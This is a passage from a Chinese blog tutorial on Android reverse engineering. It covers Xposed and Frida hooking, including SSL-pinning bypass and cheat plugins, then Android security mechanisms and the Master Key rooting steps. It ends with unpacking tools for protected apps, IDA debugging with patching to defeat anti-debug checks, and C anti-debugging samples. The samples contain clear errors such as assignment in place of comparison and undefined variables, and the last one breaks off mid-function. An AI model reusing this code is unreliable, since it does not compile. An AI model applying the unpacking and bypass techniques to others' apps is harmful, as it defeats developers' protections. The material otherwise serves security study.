class="headerlink" title="插件开发步骤:"></a>插件开发步骤:</h3><ul><li>添加第三方jar包</li><li>配置插件入口类</li><li>编写hook代码</li></ul><h4 id="Xposed插件开发-https-q0o0p-top-2021-03-30-Xposed-hook"><a href="#Xposed插件开发-https-q0o0p-top-2021-03-30-Xposed-hook" class="headerlink" title="Xposed插件开发: https://q0o0p.top/2021/03/30/Xposed-hook/"></a>Xposed插件开发: <a href="https://q0o0p.top/2021/03/30/Xposed-hook/">https://q0o0p.top/2021/03/30/Xposed-hook/</a></h4><p>注意:<br><code>当 Frida 使应用程序崩溃时，可以尝试Xposed。接下来，与丰富的 Frida脚本类似，可以轻松地使用 Xposed 附带的许多模块中的一个，例如前面讨论的绕过 SSL 检测的模块（JustTrustMe 和 sslunpining）。Xposed 还包括其他模块，比如Inspeckage，它允许进行更深入的应用程序测试。除此之外，还可以创建自己的模块来绕过 Android 应用程序常用的安全机制</code></p><h2 id="Frida"><a href="#Frida" class="headerlink" title="Frida"></a>Frida</h2><h3 id="Frida-介绍"><a href="#Frida-介绍" class="headerlink" title="Frida 介绍"></a>Frida 介绍</h3><p>frida 是一款基于 python 和 java 的 hook 框架，是一种动态插桩工具，可以插入代码到原生App的内存空间中，动态的监视和修改其行行为，可运行在Android、iOS、Linux和windows等多个平台。</p><p>插桩技术 是指将额外的代码注入程序中以收集运行时的信息，可分为两种：</p><ol><li>源代码插桩【Source Code Instrumentation(SCI)】：额外代码注入到程序源代码中。</li><li>二进制插桩【Binary Instrumentation】：额外代码注入到二进制可执行文件中，其又可分为两种：<br> ● 静态二进制插桩  【 Static Binary Instrumentation(SBI) 】：<pre><code>         在程序执行前插入额外的代码和数据，生成一个永久改变的可执行文件。</code></pre> ● 动态二进制插桩  【 Dynamic Binary Instrumentation(DBI) 】：<pre><code>         在程序运行时实时地插入额外代码和数据，对可执行文件没有任何永久改变。</code></pre></li></ol><h3 id="Frida-作用"><a href="#Frida-作用" class="headerlink" title="Frida 作用"></a>Frida 作用</h3><p>访问进程的内存<br>应用程序运行时覆盖功能<br>从导入的类调用函数<br>动态Hook跟踪、拦截函数等</p><p>客户端：PC（控制端）<br>客户端编写的 Python 代码，用于连接远程设备，提交要注入的 JS代码到服务端，接受服务端发来的消息。 </p><p>服务器：手机设备（被控制端）<br>服务端中需要用 JS 代码注入到目标进程，操作内存数据，给客户端发送消息。</p><h3 id="Frida的优缺点"><a href="#Frida的优缺点" class="headerlink" title="Frida的优缺点"></a>Frida的优缺点</h3><p>优点：在上面我们可以看到他的优点在于配置环境很简单，操作也很便捷，对于破解者开发阶段非常好用。支持Java层和Native层hook操作，在Native层hook如果是非基本类型的话操作有点麻烦。</p><p>缺点：因为他只适用于破解者在开发阶段，也就是他没法像Xposed用于实践生产中，比如我写一个微信外挂用Frida写肯定不行的，因为他无法在手机端运行。也就是破解者用的比较多。</p><h4 id="Frida实例-https-q0o0p-top-2021-03-24-cydia-hook"><a href="#Frida实例-https-q0o0p-top-2021-03-24-cydia-hook" class="headerlink" title="Frida实例: https://q0o0p.top/2021/03/24/cydia-hook/"></a>Frida实例: <a href="https://q0o0p.top/2021/03/24/cydia-hook/">https://q0o0p.top/2021/03/24/cydia-hook/</a></h4><h3 id="SubstrateCydia的优缺点"><a href="#SubstrateCydia的优缺点" class="headerlink" title="SubstrateCydia的优缺点"></a>SubstrateCydia的优缺点</h3><p>优点：可以运行在手机端，和Xposed类似可以用于实践生产中。支持Java层和Native层的hook操作，但是Java层hook不怎么常用，用的比较多的是 Native 层 hook 操作，因为他也是Android工程可以引用系统api，操作更为方便。</p><p>缺点：和Xposed一样安装配置环境繁琐，兼容性差。</p><p>总结: <code>Java层Hook还是Xposed方便，写 Native 层 Hook 还是Cydia 了，而对于破解者开发那还是 Frida 最靠谱了。写外挂最难的也是最重要的不是写代码而是寻找 hook点，也就是逆向分析 app 找到那个地方，然后写 hook 代码实现插件功能。</code></p><hr><h2 id="Android安全机制"><a href="#Android安全机制" class="headerlink" title="Android安全机制"></a>Android安全机制</h2><p>系统中的文件的访问权限是通过<code>用户ID（UID）和用户组ID（GID）</code>来控制的。换句话说，就是Linux的安全机制是基于UID和GID来实现的。Android在Linux内核提供的基于UID和GID的安全机制的基础上，又实现了一套称为Permission的安全机制(三个基本角色：用户-&gt;进程-&gt;文件)<br>一个UID可以对应多个GID,用户属性划分为三组：Owner、Group和Other。</p><p>android安全机制覆盖到各个层面，求开放的同时也保护用户的数据，应用程序和设备的安全。主要安全模型如下： </p><h3 id="进程沙箱隔离机制"><a href="#进程沙箱隔离机制" class="headerlink" title="进程沙箱隔离机制"></a>进程沙箱隔离机制</h3><p>  进程沙箱隔离机制，使得Android应用程序在安装时被赋予独特的用户标识（UID），并永久保持。应用程序及其运行的Dalvik虚拟机运行在独立的Linux进程空间，与其它应用程序完全隔离。 </p><h3 id="应用程序签名机制"><a href="#应用程序签名机制" class="headerlink" title="应用程序签名机制"></a>应用程序签名机制</h3><p>有特例程序共享uid；<br>应用签名机制：规定APK文件必须被开发者进行数字签名，以便标识应用程序作者和在应用程序之间的信任关系。在安装应用程序APK时，系统安装程序首先检查APK是否被签名，有签名才能安装。当应用程序升级时，需要检查新版应用的数字签名与已安装的应用程序的签名是否相同，否则，会被当做一个新的应用程序。Android开发者有可能把安装包命名为相同的名字，通过不同的签名可以把他们区分开来，也保证签名不同的包不被替换，同时防止恶意软件替换安装的应用。</p><h3 id="权限声明机制"><a href="#权限声明机制" class="headerlink" title="权限声明机制"></a>权限声明机制</h3><p>权限声明机制：要想获得在对象上进行操作，就需要把权限和此对象的操作进行绑定。不同级别要求应用程序行使权限的认证方式也不一样，Normal级申请就可以使用，Dangerous级需要安装时由用户确认，Signature和Signatureorsystem级则必须是系统用户才可用。<br>访问控制机制：确保文件系统和永和数据不受非法访问。 </p><h3 id="访问控制机制"><a href="#访问控制机制" class="headerlink" title="访问控制机制"></a>访问控制机制</h3><h3 id="进程通信机制"><a href="#进程通信机制" class="headerlink" title="进程通信机制"></a>进程通信机制</h3><p>进程间通信机制binder，基于共享内存的Binder实现，提供轻量级的远程进程调用（RPC）。通过接口描述语言（AIDL）定义接口与交换数据的类型，确保进程间通信的数据不会溢出越界。 </p><h3 id="内存通信机制"><a href="#内存通信机制" class="headerlink" title="内存通信机制"></a>内存通信机制</h3><p>  内存管理机制，基于Linux的低内存管理机制，设计实现了独特的LMK，将进程重要性分级、分组，当内存不足时，自动清理级别进程所占用的内存空间。同时，引入的Ashmem内存机制，使得Android具备清理不再使用共享内存区域的能力。</p><p>正是因为Android采用多层架构，在保护信息安全的同时，也保证开放平台的灵活性。</p><h3 id="SELinux"><a href="#SELinux" class="headerlink" title="SELinux"></a>SELinux</h3><p>SE Android</p><p>看源码见<a href="http://blog.csdn.net/luoshengyang/article/details/37613135">http://blog.csdn.net/luoshengyang/article/details/37613135</a><br>Android是一个基于Linux内核的系统，像传统的Linux系统一样，Android也有用户的概念。只不过这些用户不需要登录，也可以使用Android系统。Android系统将每一个安装在系统的APK都映射为一个不同的Linux用户。也就是每一个APK都有一个对应的UID和GID，这些UID和GID在APK安装的时候由系统安装服务PackageManagerService分配。Android沙箱隔离机制就是建立在Linux的UID和GID基础上。</p><p>这种基于Linux UID/GID的安全机制存在什么样的问题呢？</p><p>Linux将文件的权限划分为读、写和执行三种，分别用字母r、w和x表示。每一个文件有三组读、写和执行权限，分别针对文件的所有者、文件所有者所属的组以及除了所有者以及在所有者所属组的用户之外所有其它用户。这样，如果一个用户想要将一个自己创建的文件交给另外一个用户访问，那么只需要相应地设置一下这个文件的其它用户权限位就可以了。所以，在Linux系统中，文件的权限控制在所有者的手中。因此，这种权限控制方式就称为自主式的，正式的英文名称为Discretionary Access Control，简称为DAC。</p><p>在理想情况下，DAC机制是没有问题的。然而，一个用户可能会不小心将自己创建的文件的权限位错误地修改为允许其它用户访问。如果这个用户是一个特权用户，并且它错误操作的文件是一个敏感的文件，那么就会产生严重的安全问题。这种误操作的产生方式有三种：</p><p>用户执行了错误的命令<br>负责执行用户命令的程序有Bug<br>负责执行用户命令的程序受到攻击<br>后来，Linux内核采用了必要的访问控制机制：SE Linux（Security-Enhanced Linux），它采用了一种强制存取控制MAC（Mandatory Access Control）策略的实现方式，目的在于通过限制系统中的任何进程以及用户对资源的访问，保护内核安全。而SE Android（Security-Enhanced Android）是Android与SE Linux的结合，由美国NSA在2012年推出的Android操作系统安全强化套件，以支持在Android平台上使用SE Linux。</p><p>目前SE Android系统中的策略机制主要有三种：</p><p>安装时MAC（install-time MAC）<br>权限取消（permission revocation）<br>权限标签传播（tag propagation）<br>安装时MAC通过查找MAC策略配置来检查应用程序的权限。权限取消可以为已安装的应用取消权限，该机制在应用程序运行的权限检查时通过查找权限取消列表来取消应用的某些权限。权限标签传播是一种污点跟踪方式的应用，Android系统的权限作为抽象的标签映射到MAC策略配置文件中。</p><p>SE Android安全机制所要保护的对象是系统中的资源，这些资源分布在各个子系统中。实际上，系统中需要保护的资源非常多，除了文件之外，还有进程、socket和IPC等。SE Android是一个复杂的安全模型，本文就不进一步分析了。</p><p>如何解决这些安全问题</p><p>Android应用会遇到各种各样的安全性问题，如何从宏观上了解各种安全隐患，积极采取适当的防御措施便变得尤为重要。那么，Android应用面临哪些安全问题呢？</p><p>病毒<br>关键信息泄露<br>APP重打包<br>进程被劫持<br>数据在传输过程遭劫持<br>Webview漏洞<br>病毒不用多说了，都是一些恶意软件。关键信息泄露，可能有些开发者并不十分留意。虽然Java代码可以做混淆，但是Android的几大组件的创建方式是依赖注入的方式，因此不能被混淆。而且目前常用的一些反编译工具比如apktool等能够毫不费劲地还原Java里的明文信息，native里的库信息也可以通过objdump或IDA获取。因此一旦Java或native代码里存在明文敏感信息，基本上就是毫无安全而言的。重打包即通过反编译后重新加入恶意的代码逻辑，重新打包一个APK文件。进程被劫持一般通过进程注入或者调试进程的方式来hook进程，改变程序运行的逻辑和顺序，从而获取程序运行的内存信息。hook需要获取root权限或者跟被hook进程相同的权限。如果手机没被root，被劫持的可能性还是较小。数据在传输过程遭劫持，一般来说是由于数据明文传输或没使用HTTPS。Webview漏洞一般由于JS注入。</p><p>现实中，出现的问题可能比上面提及的还要多。总的来说，应该从以下几个方面来应对Android开发的常见安全问题：</p><p>应用权限控制。通过控制应用程序的权限防止恶意应用对系统造成破坏，采取的措施包括合理使用系统内置权限和应用程序自定义权限。<br>应用程序签名。采用数字签名为应用程序签名。<br>应用加固。应用加固包括病毒扫描、防注入、防调试、防篡改四个模块，目前行业内已经出现了很多的应用加固解决方案，如360应用加固、腾讯云应用加固、百度应用加固等等。<br>静态代码分析。通过静态代码分析工具lint监测安全隐患，对代码进行优化。<br>防火墙。必要时为Android设备安装防火墙，以防止远程网络攻击。<br>数据存储加密。采用加密的方式保护应用程序敏感数据，如利用SQLCipher加密SQLite数据库。<br>应用程序组件开发的安全要点。Activity, Service, Content Provider, Broadcast Receiver等组件在代码层面应采取的安全措施。它们每一个都可以通过隐式的Intent方式打开，所以这些组件只要不是对外公开的必须在AndroidManifest里面注明exported为false，禁止其它程序访问我们的组件。对于要和外部交互的组件，应当添加访问权限的控制，还需要要对传递的数据进行安全的校验。</p><p>当然，还有Android NDK(Native Development Kit)，使得应用程序可以不依赖Dalvik虚拟机进行开发。Android运行时核心库提供android.os, android.net, android.media等核心API，而Dalvik虚拟机依赖Linux内核，实现进程隔离与线程调度管理、安全与异常管理、垃圾回收等功能，并被改进以适应低内存、低处理器速度的移动设备环境。</p><p>再往上就是应用程序框架层了。一系列的Android应用程序所需的类库，使得开发人员可以快速地进行程序开发，也可以通过继承实现个性化的扩展。如Activity Manager负责主线程ActivityThread的创建、Activity生命周期的维护，并为窗口提供交互的接口。</p><p>应用层就是与用户直接交互的应用程序，如SMS短信、图片浏览器、地图以及开发人员所开发的应用程序。</p><hr><h2 id="Android系统架构如下："><a href="#Android系统架构如下：" class="headerlink" title="Android系统架构如下："></a>Android系统架构如下：</h2><p>android采用自下而上的分层架构，linux内核层，硬件抽象层，运行时和c语言库，程序框架层和应用层。<br>Android以linux内核为基础实现硬件设备驱动，进程和内存管理，网络协议栈、电源管理等核心系统功能。android基于移动设备在linux的基础上补充了内存管理，匿名共享内存和进程间通信binder。 </p><p>HAL(Hardware Abstraction Layer)规定了一套应用层对硬件层的读写和配置的统一接口，本质上是将硬件的驱动分为用户空间和内核空间，其中内核驱动程序运行在内核空间，HAL运行在用户空间。上图中的Stub，以so库的形式存在，可以理解为proxy。上层通过调用标识获得HAL的相关Stub，进而取得相应操作。</p><hr><h2 id="经典漏洞"><a href="#经典漏洞" class="headerlink" title="经典漏洞"></a>经典漏洞</h2><h3 id="Master-Key漏洞"><a href="#Master-Key漏洞" class="headerlink" title="Master Key漏洞"></a>Master Key漏洞</h3><p>官方的文章：<a href="http://bluebox.com/corporate-blog/bluebox-uncovers-android-master-key/">http://bluebox.com/corporate-blog/bluebox-uncovers-android-master-key/</a></p><ol><li>找到一个具有系统签名的APP，并且这个APP通过android:sharedUserId属性申请了android.uid.system这个UID。</li><li>通过Master Key向这个APP注入恶意代码。</li><li>注入到这个APP的恶意代码在运行时就获得了system用户身份。</li><li>修改/data/local.prop文件，将属性ro.kernel.qemu的值设置为1。</li><li>重启手机，由于ro.kernel.qemu的值等于1，这时候手机里面的adb进程不会被setuid剥夺掉root权限。</li><li>通过具有root权限的adb进程就可以向系统注入我们熟悉的su和superuser.apk，于是整个root过程完成。</li></ol><p><code>注意，第1步之所以要找一个具有系统签名的APP，是因为通过android:sharedUserId属性申请android.uid.system这个UID需要有系统签名，也就是说不是谁可以申请system这个UID的。另外，/data/local.prop文件的Owner是system，因此，只有获得了system这个UID的进程，才可以对它进行修改。</code></p><p>  再说说Signature与Permission的关系。有些Permission，例如INSTALL_PACKAGE，不是谁都可以申请的，必须要具有系统签名才可以，这样就可以控制Suppementary GID的分配，从而控制应用程序进程的权限。具有哪些Permission是具有系统签名才可以申请的，可以参考官方文档：<a href="http://developer.android.com/reference/android/Manifest.html%EF%BC%8C%E5%B0%B1%E6%98%AF%E5%93%AA%E4%BA%9B%E6%A0%87%E8%AE%B0%E4%B8%BA%E2%80%9CNot">http://developer.android.com/reference/android/Manifest.html，就是哪些标记为“Not</a> for use by third-party applications”的Permission。</p><p>了解了Android的Permission机制之后，就可以知道：</p><pre><code>     1. Android的APK就相当于是Linux的UID。     2. Android的Permission就相当于是Linux的GID。     3. Android的Signature就是用来控制APK的UID和GID分配的。</code></pre><hr><h2 id="常用调试工具"><a href="#常用调试工具" class="headerlink" title="常用调试工具"></a>常用调试工具</h2><p>Smali、Dedexer、Dexdump、Apktool、Dex2jar、jd-gui。<br>ida动态调式和代码跟踪<br>IDA工具分析的ARM汇编，IDA打开SO文件看到的就是ARM汇编指令。</p><h3 id="JADX"><a href="#JADX" class="headerlink" title="JADX"></a>JADX</h3><p>介绍一个反编译利器 JADX ，它可以直接将 Apk 反编译成 Java 代码进行查看，毕竟 smali 代码不是那么人性化。<br>直接就可以看到对应的 Java 代码，理清逻辑之后再去阅读 smali 代码进行修改，事半功倍。支持反编译 Java 代码的工具还有很多，例如基于 Python 实现的 Androgurad 等等。</p><h3 id="DexExtractor"><a href="#DexExtractor" class="headerlink" title="DexExtractor"></a>DexExtractor</h3><p>功能：<br>用于破解邦邦加密的安卓dex文件提取器<br>github主页<br>lambdalang/DexExtractor<br>使用说明<br>4.4的虚拟机 编译好了libdvm。<br>代码github上，脱梆梆的壳，别的没测试<br>把dexdump出来，然后base64解码下，然后odex2dex，没了<br>system.img 有空上传<br>作者编译好的镜像文件system.img的下载地址<br>system-arm_md5_6395c2f1451dbbed027d7293ab39a6e7.img.tar.gz<br>启动模拟器加上sdcard<br>注意<br>apk没有写权限的反编译了加上write就好了。<br>支持<br>梆梆加固<br>爱加密（新版本没事）<br>其他，暂时没测试</p><h3 id="InDroid"><a href="#InDroid" class="headerlink" title="InDroid"></a>InDroid</h3><ul><li>romangol/InDroid: Dalvik vm Instrumentation OS</li><li>作者：GoSSIP小组</li><li>功能：基于Dalvik VM的插桩分析框架</li><li>原理：<br>直接修改AOSP上的Dalvik VM解释器，在解释器解释执行Dalvik字节码时，插入监控的代码，这样就可以获取到所有程序运行于Dalvik上的动态信息，如执行的指令、调用的方法信息、参数返回值、各种Java对象的数据等等。InDroid只需要修改AOSP的dalvik vm部分代码，编译之后，可直接将编译生成的新libdvm.so刷入任何AOSP支持的真机设备上</li></ul><h3 id="drizzleDumper"><a href="#drizzleDumper" class="headerlink" title="drizzleDumper"></a>drizzleDumper</h3><p>听别人提到过，自己没用过。</p><ul><li>功能：一款基于内存搜索的Android脱壳工具<br>可以从运行中的安卓app中，利用ptrace机制，导出dex文件<br>github主页<br>DrizzleRisk/drizzleDumper: drizzleDumper是一款基于内存搜索的Android脱壳工具<br>机制和原理<br>root设备之后，通过ptrace附加需要脱壳的apk进程，然后在脱壳的apk进程的内存中进行dex文件的特征搜索，当搜索到dex文件时，进行dex文件的内存dump<br>使用步骤<br>将 \armeabi 下的drizzleDumper push进手机<br>进入shell，赋给可执行权限<br>运行drizzleDumper [包名] [等待时间,默认为0]<br>运行需要脱壳程序<br>使用举例<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&gt;adb push F:\drizzleDumper /data/<span class="built_in">local</span>/tmp</span><br><span class="line">$&gt;chmod 755 drizzleDumper</span><br><span class="line">$&gt;./drizzleDumper xyz.sysorem.crackme</span><br></pre></td></tr></table></figure></li></ul><h3 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h3><ul><li><p>IDA 动态调试环境搭建<br>将F:\AndroidTools\IDA_Pro_v7.5_Portable\dbgsrv路径下的android_server<br>push到模拟器上</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb push F:\AndroidTools\IDA_Pro_v7.5_Portable\dbgsrv\android_server /data/<span class="built_in">local</span>/tmp</span><br></pre></td></tr></table></figure><p>模拟器终端运行android_server</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">adb shell</span><br><span class="line">su </span><br><span class="line"><span class="built_in">cd</span> /data/<span class="built_in">local</span>/tmp</span><br><span class="line">chmod 777 android_server</span><br><span class="line">./android_server //端口被占用使用./android_server -p31928 修改端口</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="3.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> //端口转发,必须与android_server运行的端口一致</span><br><span class="line">adb forward tcp:23946 tcp:23946</span><br></pre></td></tr></table></figure><p>打开IDA -&gt; Debugger -&gt; Attach -&gt; Remote ARMLinux/Android debugger</p></li><li><blockquote><p>hostname:127.0.0.1 </p></blockquote></li><li><blockquote><p>端口填写以上端口 -&gt; 点击ok </p></blockquote></li><li><blockquote><p>呈现所有手机上运行中的程序的一个线程(搜索要调试的应用,当然首先模拟器要打开此app)<br>选择以后点击ok </p></blockquote></li><li><blockquote><p>debugger </p></blockquote></li><li><blockquote><p>debugger option </p></blockquote></li><li><blockquote><p>勾选 Suspend on process,<br>Suspend on thread,Suspend on library<br><img src="4.png"></p></blockquote></li><li><p>IDA 窗口介绍<br>空格 : 视图切换<br>IDA-view-PC : 反汇编窗口<br>Hex-view : 十六进制编辑窗口<br>Outout windows : 输出窗口<br>general register : 寄存器窗口<br>Stack view : 栈视图<br>View -&gt; Open subviews -&gt; String : 字符串编辑窗口 (Shift+F12)<br>可以看到此程序所有常量字符串列表(分析方向之一)<br>Search -&gt;Search : 字符串查找窗口<br>Jump -&gt; Jump Address : 地址跳转<br>File -&gt; Script file : 脚本执行窗口(选择执行的脚本)<br>右键点击函数名 -&gt; List cross refereaces to (Ctrl+x) : 交叉引用</p></li><li><p>IDA 快捷键<br>F2: 下断点<br>F7: 单步步入(点击可以继续往下走)<br>F8: 单步步过(不执行函数直接过去)<br>F4: 运行到光标所在(程序运行到光标所在之处)<br>G: 可以直接跳到一个地址<br>U: 把一个数据解析成未定义的数据(Udefine)<br>C: 将数据解析成汇编指令<br>P: 将汇编指令识别成函数<br>Ctrl+F: 搜素指令<br>F5: 将汇编识别为伪代码<br>Alt+G: 判断当前的系统的指令是Thumb还是ARM<br>Ctrl+S: 查看系统中所有的模块<br>X: 交叉引用(可以看到所有对此字符串或函数的一个引用)</p></li><li><p>修改寄存器的值<br>(1) 选中寄存器,右键选择<code>Modify value</code> 可以改为任意值<br>(2) 选中寄存器,直接<code>Zero value</code>选项,置零 </p></li><li><p>篡改内存数据<br>例如 IDA View-PC<br>ADD R2,PC,R2<br>Hex View<br>右键 -&gt; Synchrogazer with -&gt; R2 -&gt; F2修改十六进制的值在次使用F2提交</p></li><li><p>NOP函数或代码<br>可用于过反调试,将该函数值置为零<br>(1) 选中函数或代码,来到十六进制窗口<br>(2) 鼠标右键,选择Synchrogazer with 同步寄存器<br>(3) 选中目标,右键 -&gt; Edit(F2)修改<br>(4) 继续右键 -&gt; Edit(F2)提交<br>程序执行到此处会编译执行下一条,紧接着读取下一条,修改需要隔三条进行修改<br>(三级流水线)</p></li><li><p>改变程序执行流程<br>改变引起跳转指令的执行流程<br>如: BLX R3<br>  CMP R0 ,#0  :BLX执行完毕会把返回值放到R0寄存器,CMP把R0和0进行比较<br>  BNE loc_75566433   :不等于则跳转<br>BNE<br>改变BNE指令执行条件,从而无法跳转目的地址,进而执行无法跳转目的地址</p></li><li><p>IDA 检测(关键文件检测)<br>data/local/tmp 目录下存在android_server 所运行的程序kill<br>IDA静态分析,打开后看到 sub_588: main函数(双击) -&gt; 看到字符串(tab一下)</p></li><li><blockquote><p>C语言查看代码逻辑 -&gt; 字符串右键, 交叉引用</p></blockquote></li></ul><hr><h2 id="调试与反调试"><a href="#调试与反调试" class="headerlink" title="调试与反调试"></a>调试与反调试</h2><h3 id="模拟器检测"><a href="#模拟器检测" class="headerlink" title="模拟器检测"></a>模拟器检测</h3><h3 id="运行调试端口检测-kill程序"><a href="#运行调试端口检测-kill程序" class="headerlink" title="运行调试端口检测,kill程序"></a>运行调试端口检测,kill程序</h3><p>端口检测方法C语言:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">check</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE* pfile=<span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">0x1000</span>])= <span class="number">0</span>;</span><br><span class="line">  <span class="comment">//执行命令 </span></span><br><span class="line">  <span class="keyword">char</span>* strCatTcp = <span class="string">&quot;cat /proc/net/tcp |grep :5D8A&quot;</span>; <span class="comment">//android_server默认使用端口号(十六进制)</span></span><br><span class="line">  <span class="keyword">char</span>* strNetstat=<span class="string">&quot;netstat |grep :23946&quot;</span>;</span><br><span class="line">  pfile = popen(strCatTcp,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">int</span> pid=getpid();</span><br><span class="line">  <span class="keyword">if</span> (<span class="literal">NULL</span> =pfile)&#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;打开命令失败!\n&quot;</span>, );</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span>(fgets(buf,<span class="keyword">sizeof</span>(buf),pfile)) &#123;</span><br><span class="line">        <span class="comment">//执行到这里判断调试状态</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;执行cat /proc/net/tcp |grep :5D8A的结果是: \n&quot;</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,buf );</span><br><span class="line">      <span class="keyword">int</span> ret =kill(pid,SIGKILL);</span><br><span class="line">  &#125;</span><br><span class="line">  pclose(pfile);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> x =<span class="number">2</span>;</span><br><span class="line">  <span class="keyword">int</span> y= <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">int</span> key;</span><br><span class="line">  x=x^y;</span><br><span class="line">  y=x^y;</span><br><span class="line">  <span class="keyword">int</span> X=x^y;</span><br><span class="line">  <span class="keyword">int</span> Y=x^y; </span><br><span class="line">  Y=Y&lt;&lt;<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">int</span> X0=x^y;</span><br><span class="line">  <span class="keyword">int</span> Y0=x&amp;y;</span><br><span class="line">  Y0=Y0 &lt;&lt; <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (Y0==<span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    key=x0+<span class="number">4543</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">int</span> encrypt = num ^ key;</span><br><span class="line">  <span class="keyword">int</span> decrypt = encrypt ^ key;</span><br><span class="line">  check()</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;加密前\n&quot;</span>,num);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;加密后\n&quot;</span>,encrypt);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;解密后\n&quot;</span>,decrypt);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>过滤端口检测的方法:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android_server -p指定端口号</span><br></pre></td></tr></table></figure><h3 id="进程名称检测"><a href="#进程名称检测" class="headerlink" title="进程名称检测"></a>进程名称检测</h3><p>进程名称检测C语言:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">check</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">int</span> bufsize = <span class="number">1024</span>;</span><br><span class="line">  <span class="function"><span class="keyword">char</span> <span class="title">filename</span><span class="params">(bufsize)</span></span>;</span><br><span class="line">  <span class="function"><span class="keyword">char</span> <span class="title">line</span><span class="params">(bufsize)</span></span>;</span><br><span class="line">  <span class="function"><span class="keyword">char</span> <span class="title">name</span><span class="params">(bufsize)</span></span>;</span><br><span class="line">  <span class="function"><span class="keyword">char</span> <span class="title">nameline</span><span class="params">(bufsize)</span></span>;</span><br><span class="line">  <span class="keyword">int</span> pid = getpid();</span><br><span class="line">  <span class="comment">//先读取Tracepid值</span></span><br><span class="line">  <span class="built_in">sprintf</span>(filename,<span class="string">&quot;/proc/%d/status&quot;</span>,pid);</span><br><span class="line">  FILE *fd=fopen(filename,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (fd!=<span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span>(fgets(line,bufsize,fd)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(line,<span class="string">&quot;Tracepid&quot;</span>)!=<span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">int</span> statue = atoi(&amp;line[<span class="number">10</span>]);</span><br><span class="line">          <span class="keyword">if</span> (statue !=<span class="number">0</span>)</span><br><span class="line">          &#123;</span><br><span class="line">            sprint(name,<span class="string">&quot;/proc/%d/cmdline&quot;</span>,statue);</span><br><span class="line">            FILE *fdname 